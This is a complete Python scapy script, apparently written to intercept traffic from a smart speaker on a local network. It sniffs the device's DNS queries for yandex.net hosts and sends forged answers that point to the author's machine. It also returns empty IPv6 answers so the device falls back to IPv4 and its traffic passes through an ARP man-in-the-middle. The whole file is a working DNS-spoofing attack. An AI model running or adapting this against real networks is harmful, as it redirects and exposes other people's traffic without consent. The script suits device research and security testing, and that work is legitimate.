#!/usr/bin/env python3
"""Answer the Station Lite's (192.168.1.65) DNS queries for *.yandex.net with
our own IP (192.168.1.68) on A, and empty answers on AAAA (forces IPv4 so the
traffic flows through our ARP MITM). Real replies are dropped by pf. Runs as
root."""
from scapy.all import sniff, DNS, DNSQR, IP, UDP, DNSRR, send

MYIP = '192.168.1.68'
LITE = '192.168.1.65'

def answer(pkt):
    try:
        qname = pkt[DNSQR].qname.decode().rstrip('.')
    except Exception:
        return
    if not (qname == 'yandex.net' or qname.endswith('.yandex.net')):
        return
    qtype = pkt[DNSQR].qtype
    if qtype == 1:  # A
        an = DNSRR(rrname=pkt[DNSQR].qname, ttl=60, rdata=MYIP)
    elif qtype == 28:  # AAAA -> empty answer, device falls back to A
        an = None
    else:
        return
    kwargs = dict(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd)
    if an is not None:
        kwargs['an'] = an
    else:
        kwargs['ancount'] = 0
    reply = (IP(src=pkt[IP].dst, dst=pkt[IP].src) /
             UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
             DNS(**kwargs))
    send(reply, iface='en0', verbose=0)
    print(f'answered {qname} type={qtype} -> {MYIP} (id={pkt[DNS].id})', flush=True)

sniff(iface='en0', filter=f'udp and src host {LITE} and dst port 53',
      prn=answer, store=0)
